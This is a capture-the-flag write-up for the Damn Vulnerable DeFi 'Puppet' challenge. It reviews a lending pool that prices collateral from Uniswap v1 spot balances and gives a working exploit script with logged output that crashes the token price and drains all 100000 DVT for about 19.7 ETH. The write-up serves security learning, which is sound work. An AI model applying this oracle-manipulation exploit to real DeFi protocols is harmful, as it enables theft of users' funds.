## 1) Challenge

> <cite>There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</cite>
> <cite>There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.</cite>
> <cite>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool. </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/8.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

For this challenge, we have only one contract: `PuppetPool` ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/puppet/PuppetPool.sol)):

```solidity

contract PuppetPool is ReentrancyGuard {

    using Address for address payable;

    mapping(address => uint256) public deposits;
    address public immutable uniswapPair;
    DamnValuableToken public immutable token;
    
    event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);

    constructor (address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH
    function borrow(uint256 borrowAmount) public payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(borrowAmount);
        
        require(msg.value >= depositRequired, "Not depositing enough collateral");
        
        if (msg.value > depositRequired) {
            payable(msg.sender).sendValue(msg.value - depositRequired);
        }

        deposits[msg.sender] = deposits[msg.sender] + depositRequired;

        // Fails if the pool doesn't have enough tokens in liquidity
        require(token.transfer(msg.sender, borrowAmount), "Transfer failed");

        emit Borrowed(msg.sender, depositRequired, borrowAmount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * 2 / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }

     /**
     ... functions to deposit, redeem, repay, calculate interest, and so on ...
     */

}

```
- `borrow` accepts the amount to borrow and prevents a reentrancy attack by using the `nonReentrant` modifier; it's also a payable function:
    - computes the deposit required to borrow the amount requested. It calls the `calculateDepositRequired` function (line `29`)
    - checks, if the ETH amount sent is `>=` than the deposit required (line `31`)
    - if the ETH amount sent is `>` than the deposit required, the difference (`msg.value - depositRequired`) is sent back to the sender (lines `33-35`)
    - updates the `deposits` variable for the `msg.sender` (line `37`)
    - transfers the tokens requested to the `msg.sender` (line `40`)
- `calculateDepositRequired` returns the deposit required as collateral. It calls `_computeOraclePrice` to retrieve the price used in the formula `amount * _computeOraclePrice() * 2 / 10 ** 18`
- `_computeOraclePrice` computes the token's price by using information from the Uniswap pair (line `51`). In particular, the price is calculated as the ratio of the Uniswap balance over the Uniswap token balance.


Here are the current balances:
- we have `25 ETH` and `1000 DVT` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L21-L22))
- the Uniswap exchange has `10 ETH` and `10 DVT` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L18-L19))
- the pool has `100000 DVT` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L23))

Looking at the `calculateDepositRequired`, it initially returns double the amount requested. With the initial price, to steal all the `100000 DVT`, we need to deposit `200000 ETH` as collateral. Unfortunately, we have `25 ETH`. 

The `_computeOraclePrice` function uses the exchange `ETH` and `DVT` balances to compute the price. It means that if the `DVT` balance of the exchange increases (the denominator in the formula), the calculated price will also decrease.

So, if we swap most of our `DVT` for some `ETH`, the value `token.balanceOf(uniswapPair)` will be much more significant compared to the `uniswapPair.balance` (that will be close to zero since we have enough `DVT` to drain most of the balance).

Once we have swapped all the `DVT`, the price will be so low that the deposit required to borrow `100000 DVT` will be less than the `ETH` we have obtained (it will be roughly `19 ETH`).


## 3) Solution

The solution consists of the following steps:
- swap `999.99 DVT` for `ETH` using the Uniswap pair by calling `tokenToEthSwapInput` (we need first to approve the Uniswap pair). We need to leave some `DVT` because the challenge requires having more than `100000 DVT` ([challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L115-L117))
- borrow `100000 DVT` from the pool by depositing the amount requested (it will be less than the `ETH` we have)

`puppet.challenge.js`:
```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let provider = ethers.provider

        function formatOutput(val){
            return parseFloat(ethers.utils.formatEther(val)).toFixed(3)
        }

        async function logData() {

            let row1 = {
                "pool DVT": formatOutput(await this.token.balanceOf(this.lendingPool.address)),
                "pool ETH": formatOutput(await provider.getBalance(this.lendingPool.address)),
                "attacker DVT": formatOutput(await this.token.balanceOf(attacker.address)),
                "attacker ETH": formatOutput(await provider.getBalance(attacker.address)),
                "exchange DVT": formatOutput(await this.token.balanceOf(this.uniswapExchange.address)),
                "exchange ETH": formatOutput(await provider.getBalance(this.uniswapExchange.address))
            }

            let depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
            console.table([row1])
            console.log(`[+] Deposit required to borrow ${formatOutput(POOL_INITIAL_TOKEN_BALANCE)} DVT: ${formatOutput(depositRequired)} ETH\n`)
        }

        let tokenAmount = ethers.utils.parseEther('999.99');

        await logData.call(this);

        let p = await this.uniswapExchange.getEthToTokenInputPrice(tokenAmount, { gasLimit: 1e6 });
        console.log(`[+] Swapping ${formatOutput(tokenAmount)} DVT. Expecting to receive: ${formatOutput(p)} ETH`)
        
        await this.token.connect(attacker).approve(this.uniswapExchange.address, tokenAmount)

        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            tokenAmount,
            1,
            (await ethers.provider.getBlock('latest')).timestamp * 2,
            { gasLimit: 1e6 }
        );


        let depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)

        await logData.call(this);

        console.log(`[+] Borrowed ${formatOutput(POOL_INITIAL_TOKEN_BALANCE)} DVT`)

        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {
            value: depositRequired
        })

        await logData.call(this);
    });

```

I added some log information to keep track of the different balances. The following is the output obtained from running the above code:

```

┌─────────┬──────────────┬──────────┬──────────────┬──────────────┬──────────────┬──────────────┐
│ (index) │   pool DVT   │ pool ETH │ attacker DVT │ attacker ETH │ exchange DVT │ exchange ETH │
├─────────┼──────────────┼──────────┼──────────────┼──────────────┼──────────────┼──────────────┤
│    0    │ '100000.000' │ '0.000'  │  '1000.000'  │   '25.000'   │   '10.000'   │   '10.000'   │
└─────────┴──────────────┴──────────┴──────────────┴──────────────┴──────────────┴──────────────┘
[+] Deposit required to borrow 100000.000 DVT: 200000.000 ETH

[+] Swapping 999.990 DVT. Expecting to receive: 9.901 ETH
┌─────────┬──────────────┬──────────┬──────────────┬──────────────┬──────────────┬──────────────┐
│ (index) │   pool DVT   │ pool ETH │ attacker DVT │ attacker ETH │ exchange DVT │ exchange ETH │
├─────────┼──────────────┼──────────┼──────────────┼──────────────┼──────────────┼──────────────┤
│    0    │ '100000.000' │ '0.000'  │   '0.010'    │   '34.901'   │  '1009.990'  │   '0.099'    │
└─────────┴──────────────┴──────────┴──────────────┴──────────────┴──────────────┴──────────────┘
[+] Deposit required to borrow 100000.000 DVT: 19.665 ETH

[+] Borrowed 100000.000 DVT
┌─────────┬──────────┬──────────┬──────────────┬──────────────┬──────────────┬──────────────┐
│ (index) │ pool DVT │ pool ETH │ attacker DVT │ attacker ETH │ exchange DVT │ exchange ETH │
├─────────┼──────────┼──────────┼──────────────┼──────────────┼──────────────┼──────────────┤
│    0    │ '0.000'  │ '19.665' │ '100000.010' │   '15.236'   │  '1009.990'  │   '0.099'    │
└─────────┴──────────┴──────────┴──────────────┴──────────────┴──────────────┴──────────────┘
[+] Deposit required to borrow 100000.000 DVT: 19.665 ETH

```


You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/puppet/puppet.challenge.js).


## 4) References

- [The Uniswap V1 Protocol](https://docs.uniswap.org/protocol/V1/reference/exchange)